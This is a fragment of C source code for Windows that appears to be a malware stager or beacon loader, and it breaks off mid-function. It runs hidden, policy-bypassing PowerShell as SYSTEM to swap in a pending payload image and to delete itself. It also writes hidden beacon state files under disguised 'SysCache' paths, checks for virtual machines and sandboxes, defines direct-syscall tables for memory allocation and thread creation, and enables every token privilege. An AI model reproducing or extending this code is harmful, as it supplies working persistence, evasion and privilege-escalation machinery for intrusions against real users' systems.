static BOOL BuildRuntimeSwapManifestPath(LPCSTR lpTargetPath, LPSTR lpManifestPath, size_t cchManifestPath) {
    if (!lpTargetPath || !*lpTargetPath || !lpManifestPath || cchManifestPath == 0) {
        return FALSE;
    }

    return _snprintf(
               lpManifestPath,
               cchManifestPath,
               "%s" STAGE_RUNTIME_SWAP_MANIFEST_SUFFIX,
               lpTargetPath
           ) > 0;
}

static BOOL ReadRuntimeSwapManifest(
    LPCSTR lpManifestPath,
    LPSTR lpTargetPath,
    size_t cchTargetPath,
    LPSTR lpPendingPath,
    size_t cchPendingPath
) {
    if (!lpManifestPath || !*lpManifestPath || !lpTargetPath || cchTargetPath == 0 ||
        !lpPendingPath || cchPendingPath == 0) {
        return FALSE;
    }

    FILE* fp = fopen(lpManifestPath, "r");
    if (!fp) {
        return FALSE;
    }

    char pendingLine[MAX_PATH] = { 0 };
    char targetLine[MAX_PATH] = { 0 };

    if (!fgets(pendingLine, sizeof(pendingLine), fp) || !fgets(targetLine, sizeof(targetLine), fp)) {
        fclose(fp);
        return FALSE;
    }
    fclose(fp);

    size_t pendingLen = strlen(pendingLine);
    size_t targetLen = strlen(targetLine);
    while (pendingLen && (pendingLine[pendingLen - 1] == '\n' || pendingLine[pendingLen - 1] == '\r')) {
        pendingLine[--pendingLen] = '\0';
    }
    while (targetLen && (targetLine[targetLen - 1] == '\n' || targetLine[targetLen - 1] == '\r')) {
        targetLine[--targetLen] = '\0';
    }

    if (!pendingLine[0] || !targetLine[0]) {
        return FALSE;
    }

    _snprintf(lpTargetPath, cchTargetPath, "%s", targetLine);
    _snprintf(lpPendingPath, cchPendingPath, "%s", pendingLine);
    return TRUE;
}

static BOOL WriteRuntimeSwapManifest(LPCSTR lpTargetPath, LPCSTR lpPendingPath) {
    if (!lpTargetPath || !*lpTargetPath || !lpPendingPath || !*lpPendingPath) {
        return FALSE;
    }

    char manifestPath[MAX_PATH] = { 0 };
    if (!BuildRuntimeSwapManifestPath(lpTargetPath, manifestPath, sizeof(manifestPath))) {
        return FALSE;
    }

    FILE* fp = fopen(manifestPath, "w");
    if (!fp) {
        return FALSE;
    }

    int written = fprintf(fp, "%s\n%s\n", lpPendingPath, lpTargetPath);
    fclose(fp);
    return written > 0;
}

static BOOL DeleteRuntimeSwapManifest(LPCSTR lpManifestPath) {
    if (!lpManifestPath || !*lpManifestPath) {
        return FALSE;
    }

    return DeleteFileA(lpManifestPath) || GetLastError() == ERROR_FILE_NOT_FOUND;
}

static BOOL ClearRuntimeSwapState(void) {
    gRuntimeSwapPendingSourcePath[0] = '\0';
    gRuntimeSwapPendingTargetPath[0] = '\0';
    return TRUE;
}

static BOOL LoadRuntimeSwapStateFromManifest(LPCSTR lpTargetPath) {
    if (!lpTargetPath || !*lpTargetPath) {
        return FALSE;
    }

    char manifestPath[MAX_PATH] = { 0 };
    if (!BuildRuntimeSwapManifestPath(lpTargetPath, manifestPath, sizeof(manifestPath))) {
        return FALSE;
    }

    char manifestTarget[MAX_PATH] = { 0 };
    char manifestPending[MAX_PATH] = { 0 };
    if (!ReadRuntimeSwapManifest(manifestPath, manifestTarget, sizeof(manifestTarget), manifestPending, sizeof(manifestPending))) {
        return FALSE;
    }

    _snprintf(gRuntimeSwapPendingTargetPath, sizeof(gRuntimeSwapPendingTargetPath), "%s", manifestTarget);
    _snprintf(gRuntimeSwapPendingSourcePath, sizeof(gRuntimeSwapPendingSourcePath), "%s", manifestPending);
    return TRUE;
}

static BOOL BuildRuntimeSwapCommand(LPCSTR lpPendingPath, LPCSTR lpTargetPath, LPSTR lpCommand, size_t cchCommand) {
    if (!lpPendingPath || !*lpPendingPath || !lpTargetPath || !*lpTargetPath || !lpCommand || cchCommand == 0) {
        return FALSE;
    }

    return _snprintf(
               lpCommand,
               cchCommand,
               "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"for($i=0;$i -lt 20;$i++){ try { Move-Item -LiteralPath '%s' -Destination '%s' -Force -ErrorAction Stop; exit 0 } catch { Start-Sleep -Milliseconds 300 } } exit 1\"",
               lpPendingPath,
               lpTargetPath
           ) > 0;
}

static BOOL ProcessRuntimeSwapManifest(HANDLE hSystemToken) {
    if (!gRuntimeSwapPendingTargetPath[0] || !gRuntimeSwapPendingSourcePath[0]) {
        return TRUE;
    }

    if (!hSystemToken) {
        LOGV("[*] Processing runtime swap manifest with current token context\n");
    }

    char commandLine[4096] = { 0 };
    if (!BuildRuntimeSwapCommand(gRuntimeSwapPendingSourcePath, gRuntimeSwapPendingTargetPath, commandLine, sizeof(commandLine))) {
        return FALSE;
    }

    BOOL bSwapped = FALSE;
    if (hSystemToken) {
        bSwapped = ExecuteSystemCommand(hSystemToken, commandLine);
    } else {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(
                NULL,
                commandLine,
                NULL,
                NULL,
                FALSE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            )) {
            DWORD exitCode = 0xFFFFFFFF;
            if (WaitForSingleObject(pi.hProcess, 12000) == WAIT_OBJECT_0) {
                if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode == 0) {
                    bSwapped = TRUE;
                }
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            LOGV("[-] Failed to launch runtime swap worker process (%lu)\n", GetLastError());
        }
    }

    if (bSwapped) {
        if (GetFileAttributesA(gRuntimeSwapPendingTargetPath) == INVALID_FILE_ATTRIBUTES) {
            LOGV("[-] Runtime swap command reported success but target is still missing: %s\n", gRuntimeSwapPendingTargetPath);
            return FALSE;
        }
        if (DeleteFileA(gRuntimeSwapPendingSourcePath)) {
            LOGV("[+] Removed pending runtime image %s\n", gRuntimeSwapPendingSourcePath);
        }
    } else {
        LOGV("[-] Runtime swap execution did not complete for %s from %s\n", gRuntimeSwapPendingTargetPath, gRuntimeSwapPendingSourcePath);
        return FALSE;
    }

    char manifestPath[MAX_PATH] = { 0 };
    if (!BuildRuntimeSwapManifestPath(gRuntimeSwapPendingTargetPath, manifestPath, sizeof(manifestPath))) {
        return FALSE;
    }
    DeleteRuntimeSwapManifest(manifestPath);
    ClearRuntimeSwapState();
    LOGV("[+] Runtime swap completed for %s\n", gRuntimeSwapPendingTargetPath);
    return TRUE;
}

static BOOL ScheduleSelfDelete(LPCSTR lpSelfPath) {
    if (!lpSelfPath || !*lpSelfPath) {
        return FALSE;
    }

    char psPath[MAX_PATH * 4] = { 0 };

    if (_snprintf(
            psPath,
            sizeof(psPath),
            "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"for($i=0; $i -lt 8; $i++) { Start-Sleep -Milliseconds 700; try { if (-not (Test-Path -LiteralPath '%s')) { break }; Remove-Item -LiteralPath '%s' -Force -ErrorAction SilentlyContinue } catch { } }\"",
            lpSelfPath,
            lpSelfPath
        ) < 0) {
        return FALSE;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdLine[2048] = { 0 };
    if (_snprintf(cmdLine, sizeof(cmdLine), "%s", psPath) < 0) {
        return FALSE;
    }

    if (!CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
        return FALSE;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

static BOOL BuildPendingStagerPath(LPCSTR lpRuntimePath, LPSTR lpPendingPath, size_t cchPendingPath) {
    if (!lpRuntimePath || !*lpRuntimePath || !lpPendingPath || cchPendingPath == 0) {
        return FALSE;
    }

    return _snprintf(
               lpPendingPath,
               cchPendingPath,
               "%s.pending.%lu.%lu",
               lpRuntimePath,
               GetCurrentProcessId(),
               GetTickCount()
           ) > 0;
}

static BOOL SchedulePersistentRuntimeSwapWithToken(HANDLE hSystemToken, LPCSTR lpPendingPath, LPCSTR lpTargetPath) {
    if (!lpPendingPath || !*lpPendingPath || !lpTargetPath || !*lpTargetPath) {
        return FALSE;
    }

    char swapCommand[4096] = { 0 };
    if (!BuildRuntimeSwapCommand(lpPendingPath, lpTargetPath, swapCommand, sizeof(swapCommand))) {
        return FALSE;
    }

    if (hSystemToken) {
        if (!ExecuteSystemCommand(hSystemToken, swapCommand)) {
            return FALSE;
        }
        return TRUE;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (!CreateProcessA(
            NULL,
            swapCommand,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
        return FALSE;
    }

    DWORD swapExitCode = 0xFFFFFFFF;
    if (WaitForSingleObject(pi.hProcess, 12000) != WAIT_OBJECT_0) {
        swapExitCode = 1;
    } else {
        DWORD code = 0xFFFFFFFF;
        if (GetExitCodeProcess(pi.hProcess, &code)) {
            swapExitCode = code;
        }
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return swapExitCode == 0;
}

static BOOL SchedulePersistentRuntimeSwap(LPCSTR lpPendingPath, LPCSTR lpTargetPath) {
    return SchedulePersistentRuntimeSwapWithToken(NULL, lpPendingPath, lpTargetPath);
}

static BOOL IsProcessIdRunningPortable(DWORD dwProcessId) {
    if (dwProcessId == 0) {
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
    if (!hProcess) {
        if (GetLastError() != ERROR_ACCESS_DENIED) {
            return FALSE;
        }

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return FALSE;
        }

        PROCESSENTRY32W pe32 = { sizeof(pe32) };
        BOOL bFound = FALSE;
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == dwProcessId) {
                    bFound = TRUE;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
        return bFound;
    }

    CloseHandle(hProcess);
    return TRUE;
}

static BOOL IsProcessIdRunning(DWORD dwProcessId) {
    return IsProcessIdRunningPortable(dwProcessId);
}

static BOOL IsConsentProcessRunning(void) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(pe32);

    BOOL bConsentFound = FALSE;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"consent.exe") == 0) {
                bConsentFound = TRUE;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return bConsentFound;
}

static BOOL IsBeaconStatefulTrackingEnabled(void) {
    if (STAGE_BEACON_STATEFUL == 0) {
        return FALSE;
    }

    char stateValue[16] = { 0 };
    DWORD valueLen = GetEnvironmentVariableA(
        "STAGE_BEACON_STATEFUL",
        stateValue,
        (DWORD)STAGE_ARRAY_COUNT(stateValue)
    );
    if (valueLen == 0) {
        return TRUE;
    }

    return !(
        _stricmp(stateValue, "0") == 0 ||
        _stricmp(stateValue, "false") == 0 ||
        _stricmp(stateValue, "off") == 0 ||
        _stricmp(stateValue, "no") == 0 ||
        _stricmp(stateValue, "disable") == 0
    );
}

static BOOL BuildBeaconStatePathFromBase(LPCSTR lpBasePath, LPSTR lpStatePath, size_t cchStatePath) {
    if (!lpBasePath || !*lpBasePath || !lpStatePath || cchStatePath == 0) {
        return FALSE;
    }

    char stateDir[MAX_PATH] = { 0 };
    if (_snprintf(
            stateDir,
            sizeof(stateDir),
            "%s\\%s",
            lpBasePath,
            STAGE_BEACON_STATE_DIRECTORY_NAME
        ) < 0) {
        return FALSE;
    }

    if (_snprintf(
            lpStatePath,
            cchStatePath,
            "%s\\%s",
            stateDir,
            STAGE_BEACON_STATE_FILE_NAME
        ) < 0) {
        return FALSE;
    }

    if (EnsureDirectoryTreeExists(stateDir)) {
        return TRUE;
    }

    char stateFlatPath[MAX_PATH] = { 0 };
    if (_snprintf(
            stateFlatPath,
            sizeof(stateFlatPath),
            "%s\\%s",
            lpBasePath,
            STAGE_BEACON_STATE_FILE_NAME
        ) < 0) {
        return FALSE;
    }
    if (!EnsureDirectoryTreeExists(lpBasePath)) {
        return FALSE;
    }
    if (_snprintf(lpStatePath, cchStatePath, "%s", stateFlatPath) < 0) {
        return FALSE;
    }
    return TRUE;
}

static BOOL BuildBeaconStatePathFromPersistentRuntime(LPSTR lpStatePath, size_t cchStatePath) {
    if (!lpStatePath || cchStatePath == 0) {
        return FALSE;
    }

    char persistentRuntimePath[MAX_PATH] = { 0 };
    if (!BuildPersistentStagerImagePath(persistentRuntimePath, sizeof(persistentRuntimePath), NULL)) {
        return FALSE;
    }

    char* slash = strrchr(persistentRuntimePath, '\\');
    if (!slash || !*slash) {
        return FALSE;
    }
    *slash = '\0';

    if (_snprintf(lpStatePath, cchStatePath, "%s\\%s", persistentRuntimePath, STAGE_BEACON_STATE_FILE_NAME) < 0) {
        return FALSE;
    }

    if (!EnsureDirectoryTreeExists(persistentRuntimePath)) {
        return FALSE;
    }

    return TRUE;
}

static BOOL BuildBeaconStatePath(LPSTR lpStatePath, size_t cchStatePath) {
    if (!lpStatePath || cchStatePath == 0) {
        return FALSE;
    }

    if (BuildBeaconStatePathFromPersistentRuntime(lpStatePath, cchStatePath)) {
        return TRUE;
    }

    char basePath[MAX_PATH] = { 0 };
    char stateBase[MAX_PATH] = { 0 };
    DWORD stateBaseLen = 0;

    stateBaseLen = GetEnvironmentVariableA("ProgramData", stateBase, MAX_PATH);
    if (stateBaseLen > 0 && stateBaseLen < MAX_PATH &&
        BuildBeaconStatePathFromBase(stateBase, lpStatePath, cchStatePath)) {
        return TRUE;
    }

    stateBaseLen = GetEnvironmentVariableA("TEMP", stateBase, MAX_PATH);
    if (stateBaseLen > 0 && stateBaseLen < MAX_PATH &&
        BuildBeaconStatePathFromBase(stateBase, lpStatePath, cchStatePath)) {
        return TRUE;
    }

    stateBaseLen = GetEnvironmentVariableA("TMP", stateBase, MAX_PATH);
    if (stateBaseLen > 0 && stateBaseLen < MAX_PATH &&
        BuildBeaconStatePathFromBase(stateBase, lpStatePath, cchStatePath)) {
        return TRUE;
    }

    if (GetEnvironmentVariableA("SystemRoot", basePath, MAX_PATH) != 0) {
        if (_snprintf(basePath, MAX_PATH, "%s\\Temp", basePath) < 0) {
            return FALSE;
        }
        if (BuildBeaconStatePathFromBase(basePath, lpStatePath, cchStatePath)) {
            return TRUE;
        }
    }

    if (!GetWindowsDirectoryA(stateBase, MAX_PATH)) {
        return FALSE;
    }
    if (_snprintf(stateBase, MAX_PATH, "%s\\Temp", stateBase) < 0) {
        return FALSE;
    }
    if (BuildBeaconStatePathFromBase(stateBase, lpStatePath, cchStatePath)) {
        return TRUE;
    }

    if (GetModuleHandleA(NULL)) {
        if (GetModuleFileNameA(NULL, stateBase, MAX_PATH) != 0) {
            char* slash = strrchr(stateBase, '\\');
            char* forwardSlash = strrchr(stateBase, '/');
            if (forwardSlash && (!slash || forwardSlash > slash)) {
                slash = forwardSlash;
            }
            if (slash) {
                *slash = '\0';
                if (BuildBeaconStatePathFromBase(stateBase, lpStatePath, cchStatePath)) {
                    return TRUE;
                }
            }
        }
    }

    return BuildFallbackBeaconStatePath(lpStatePath, cchStatePath);
}

static BOOL BuildFallbackBeaconStatePath(LPSTR lpStatePath, size_t cchStatePath) {
    char fallbackBase[MAX_PATH] = { 0 };
    DWORD tempLen = GetTempPathA(MAX_PATH, fallbackBase);
    if (tempLen == 0) {
        if (!GetWindowsDirectoryA(fallbackBase, MAX_PATH)) {
            return FALSE;
        }
        if (_snprintf(fallbackBase, MAX_PATH, "%s\\Temp", fallbackBase) < 0) {
            return FALSE;
        }
    } else if (tempLen >= MAX_PATH) {
        return FALSE;
    }

    size_t fallbackBaseLen = strlen(fallbackBase);
    if (fallbackBaseLen > 0 &&
        (fallbackBase[fallbackBaseLen - 1] == '\\' || fallbackBase[fallbackBaseLen - 1] == '/')) {
        fallbackBase[fallbackBaseLen - 1] = '\0';
    }

    return BuildBeaconStatePathFromBase(fallbackBase, lpStatePath, cchStatePath);
}


static BOOL ReadBeaconStateMarkerFromPath(
    LPCSTR lpStatePath,
    DWORD* pdwBeaconPid,
    DWORD* pdwStagerPid,
    ULONGLONG* pCreatedUnix
) {
    if (!lpStatePath || !*lpStatePath || !pdwBeaconPid || !pdwStagerPid || !pCreatedUnix) {
        return FALSE;
    }

    *pdwBeaconPid = 0;
    *pdwStagerPid = 0;
    *pCreatedUnix = 0;

    FILE* pState = fopen(lpStatePath, "r");
    if (!pState) {
        return FALSE;
    }

    char line[256] = { 0 };
    while (fgets(line, sizeof(line), pState)) {
        size_t len = strlen(line);
        if (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
            while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
                line[--len] = '\0';
            }
        }

        if (_strnicmp(line, "payload_pid=", 12) == 0) {
            *pdwBeaconPid = (DWORD)strtoul(line + 12, NULL, 10);
            continue;
        }
        if (_strnicmp(line, "stager_pid=", 11) == 0) {
            *pdwStagerPid = (DWORD)strtoul(line + 11, NULL, 10);
            continue;
        }
        if (_strnicmp(line, "pid=", 4) == 0 && *pdwBeaconPid == 0) {
            *pdwBeaconPid = (DWORD)strtoul(line + 4, NULL, 10);
            continue;
        }
        if (_strnicmp(line, "created_unix=", 13) == 0) {
            *pCreatedUnix = _strtoui64(line + 13, NULL, 10);
        }
    }

    fclose(pState);
    return TRUE;
}

static BOOL ReadBeaconStateMarker(DWORD* pdwBeaconPid, DWORD* pdwStagerPid, ULONGLONG* pCreatedUnix) {
    if (!pdwBeaconPid || !pdwStagerPid || !pCreatedUnix) {
        return FALSE;
    }

    char statePath[MAX_PATH] = { 0 };
    if (BuildBeaconStatePath(statePath, sizeof(statePath)) &&
        ReadBeaconStateMarkerFromPath(statePath, pdwBeaconPid, pdwStagerPid, pCreatedUnix)) {
        return TRUE;
    }

    const char* fallbackPaths[] = {
        "C:\\ProgramData\\SysCache\\runtime.state",
        "C:\\ProgramData\\runtime.state",
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\SysCache\\runtime.state",
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\runtime.state",
        "C:\\Windows\\Temp\\SysCache\\runtime.state",
        "C:\\Windows\\Temp\\runtime.state",
        NULL
    };

    for (int i = 0; fallbackPaths[i] != NULL; ++i) {
        if (ReadBeaconStateMarkerFromPath(fallbackPaths[i], pdwBeaconPid, pdwStagerPid, pCreatedUnix)) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL WriteBeaconStateMarkerToPath(LPCSTR lpStatePath, DWORD dwBeaconPid, DWORD dwStagerPid) {
    if (!lpStatePath || !*lpStatePath) {
        return FALSE;
    }

    char stateDir[MAX_PATH] = { 0 };
    char tempStatePath[MAX_PATH] = { 0 };
    if (_snprintf(stateDir, sizeof(stateDir), "%s", lpStatePath) < 0) {
        return FALSE;
    }
    if (_snprintf(tempStatePath, sizeof(tempStatePath), "%s.tmp", lpStatePath) < 0) {
        return FALSE;
    }

    char* slash = strrchr(stateDir, '\\');
    if (!slash) {
        return FALSE;
    }
    *slash = '\0';
    if (!EnsureDirectoryTreeExists(stateDir)) {
        return FALSE;
    }

    HANDLE hState = CreateFileA(
        tempStatePath,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN,
        NULL
    );
    if (hState == INVALID_HANDLE_VALUE) {
        LOGV("[-] Failed to create beacon state temp file %s (%lu)\n", tempStatePath, GetLastError());
        return FALSE;
    }

    ULONGLONG currentTs = GetCurrentUnixTime();
    char marker[192] = { 0 };
    if (_snprintf(
            marker,
            sizeof(marker),
            "pid=%lu\r\npayload_pid=%lu\r\nstager_pid=%lu\r\ncreated_unix=%llu\r\n",
            dwBeaconPid,
            dwBeaconPid,
            dwStagerPid,
            currentTs
        ) < 0) {
        CloseHandle(hState);
        return FALSE;
    }

    DWORD bytesWritten = 0;
    DWORD markerLen = (DWORD)strlen(marker);
    DWORD actualWritten = 0;
    if (!WriteFile(hState, marker, markerLen, &actualWritten, NULL) || actualWritten != markerLen) {
        LOGV("[-] Failed to write beacon state temp file %s (%lu bytes=%lu/%lu)\n", tempStatePath, GetLastError(), actualWritten, markerLen);
        CloseHandle(hState);
        DeleteFileA(tempStatePath);
        return FALSE;
    }
    FlushFileBuffers(hState);

    CloseHandle(hState);
    if (!MoveFileExA(tempStatePath, lpStatePath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
        LOGV("[-] Failed to commit beacon state file %s (%lu)\n", lpStatePath, GetLastError());
        DeleteFileA(tempStatePath);
        return FALSE;
    }
    return TRUE;
}

static BOOL WriteBeaconStateMarkerWithPids(DWORD dwBeaconPid, DWORD dwStagerPid) {
    if (dwBeaconPid == 0) {
        dwBeaconPid = GetCurrentProcessId();
    }

    char statePath[MAX_PATH] = { 0 };
    if (!BuildBeaconStatePath(statePath, sizeof(statePath))) {
        LOGV("[-] Failed to resolve beacon state path.\n");
    } else if (WriteBeaconStateMarkerToPath(statePath, dwBeaconPid, dwStagerPid)) {
        return TRUE;
    }

    const char* fallbackPaths[] = {
        "C:\\ProgramData\\runtime.state",
        "C:\\Windows\\Temp\\SysCache\\runtime.state",
        "C:\\ProgramData\\SysCache\\runtime.state",
        "C:\\Windows\\Temp\\runtime.state",
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\SysCache\\runtime.state",
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\runtime.state",
        NULL
    };

    for (int i = 0; fallbackPaths[i] != NULL; ++i) {
        if (WriteBeaconStateMarkerToPath(fallbackPaths[i], dwBeaconPid, dwStagerPid)) {
            LOGV("[+] Wrote beacon state marker to fallback path %s\n", fallbackPaths[i]);
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL WriteBeaconStateMarker(DWORD dwImplantPid) {
    return WriteBeaconStateMarkerWithPids(dwImplantPid, 0);
}

static BOOL WriteBeaconStateMarkerForCurrentStager(void) {
    return WriteBeaconStateMarkerWithPids(GetCurrentProcessId(), 0);
}

static BOOL IsExistingBeaconActive(ULONGLONG ullNow) {
    if (IsConsentProcessRunning()) {
        LOGV("[*] consent.exe detected in process list; treating beacon/service relaunch as already active.\n");
        return TRUE;
    }

    if (!IsBeaconStatefulTrackingEnabled()) {
        LOGV("[*] Stateful beacon tracking disabled; relaunch suppression is consent.exe-process based.\n");
        return FALSE;
    }

    DWORD beaconPid = 0;
    DWORD stagerPid = 0;
    ULONGLONG createdTs = 0;

    if (!ReadBeaconStateMarker(&beaconPid, &stagerPid, &createdTs)) {
        LOGV("[*] Duplicate beacon check: no readable marker state yet.\n");
        return FALSE;
    }

    LOGV("[*] Duplicate beacon check marker: beacon=%lu stager=%lu created=%llu\n", beaconPid, stagerPid, createdTs);

    DWORD currentPid = GetCurrentProcessId();
    if (stagerPid != 0 && stagerPid != currentPid && IsProcessIdRunning(stagerPid)) {
        LOGV("[*] Duplicate beacon check: active stager process %lu detected.\n", stagerPid);
        return TRUE;
    }

    if (beaconPid != 0 && IsProcessIdRunning(beaconPid)) {
        LOGV("[*] Duplicate beacon check: active payload pid %lu detected.\n", beaconPid);
        return TRUE;
    }

    if (createdTs > 0) {
        if (createdTs >= ullNow) {
            LOGV("[*] Duplicate beacon check: marker timestamp is in the future; treating as active.\n");
            return TRUE;
        }
        if ((ullNow - createdTs) < STAGE_BEACON_STATE_TTL_SECONDS) {
            LOGV("[*] Duplicate beacon check: marker age %llu < ttl(%d).\n", (ullNow - createdTs), STAGE_BEACON_STATE_TTL_SECONDS);
            return TRUE;
        }
    }

    LOGV("[*] Duplicate beacon check: no active marker state found; continuing with launch path.\n");
    return FALSE;
}

static void LogWritef(BOOL bPrintToConsole, BOOL bWriteToFile, LPCSTR lpFormat, va_list args) {
    char line[2048] = {0};
    int lineLen = _vsnprintf(line, sizeof(line), lpFormat, args);
    if (lineLen < 0) {
        lineLen = 0;
        line[0] = '\0';
    }

    if (bPrintToConsole) {
        printf("%s", line);
    }

    if (bWriteToFile) {
        AppendLogFile(line);
    }
}

static void LogWrite(BOOL bPrintToConsole, BOOL bWriteToFile, LPCSTR lpFormat, ...) {
    va_list args;
    va_start(args, lpFormat);
    LogWritef(bPrintToConsole, bWriteToFile, lpFormat, args);
    va_end(args);
}

#define STAGER_MAGIC "SLVRSTG1"
#define STAGER_MAGIC_LEN 8
#define STAGER_DEFAULT_KEY_LEN 16

// ============================================================================
// SYSCALL STRUCTURES
// ============================================================================

#include <winternl.h>

typedef struct _VX_TABLE_ENTRY {
    PVOID pAddress;
    DWORD dwHash;
    WORD wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
    VX_TABLE_ENTRY NtDelayExecution;
    VX_TABLE_ENTRY NtContinue;
} VX_TABLE, *PVX_TABLE;

typedef struct _NT_SYSCALL_INIT {
    LPCSTR  lpName;
    PVOID*  ppAddress;
    WORD*   pwSystemCall;
} NT_SYSCALL_INIT, *PNT_SYSCALL_INIT;

// ============================================================================
// ANTI-SANDBOX
// ============================================================================

BOOL CheckSandbox() {
    BOOL bSandbox = FALSE;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) bSandbox = TRUE;
    
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) bSandbox = TRUE;
    
    DWORD uptime = GetTickCount64();
    if (uptime < 600000) bSandbox = TRUE;
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        bSandbox = TRUE;
    }
    
    if (!bSandbox) {
        DWORD sleepTime = (rand() % 5000) + 3000;
        Sleep(sleepTime);
    }
    return FALSE; // Disabled for testing
}

// ============================================================================
// PRIVILEGE ESCALATION - Token Duplication
// ============================================================================

BOOL EnablePrivilegeForProcess(LPCSTR lpPrivilege) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, lpPrivilege, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    BOOL b = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return b;
}

static BOOL EnableAllTokenPrivilegesInToken(HANDLE hToken) {
    DWORD dwSize = 0;
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            LOGV("[-] Failed to query token privileges for bulk enable (%lu)\n", GetLastError());
            return FALSE;
        }
    }

    PTOKEN_PRIVILEGES pTokenPrivs = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, dwSize);
    if (!pTokenPrivs) {
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, dwSize, &dwSize)) {
        LOGV("[-] Failed to read token privileges for bulk enable (%lu)\n", GetLastError());
        LocalFree(pTokenPrivs);
        return FALSE;
    }

    DWORD toEnableCount = 0;
    for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
        if (pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_REMOVED) {
            continue;
        }

        if ((pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) == 0) {
            pTokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
            toEnableCount++;
        } else {
            pTokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
        }
    }

    if (toEnableCount == 0) {
        LocalFree(pTokenPrivs);
        return TRUE;
    }

    AdjustTokenPrivileges(hToken, FALSE, pTokenPrivs, 0, NULL, NULL);
    DWORD adjustError = GetLastError();
    if (adjustError != ERROR_SUCCESS && adjustError != ERROR_NOT_ALL_ASSIGNED) {
        LOGV("[-] Failed to enable all available token privileges (%lu)\n", adjustError);
        LocalFree(pTokenPrivs);
        return FALSE;
    }

    if (adjustError == ERROR_NOT_ALL_ASSIGNED) {
        LOGV("[*] Some token privileges could not be enabled; continuing with enabled subset.\n");
    } else {
        LOGV("[+] Enabled %lu token privileges.\n", toEnableCount);
    }

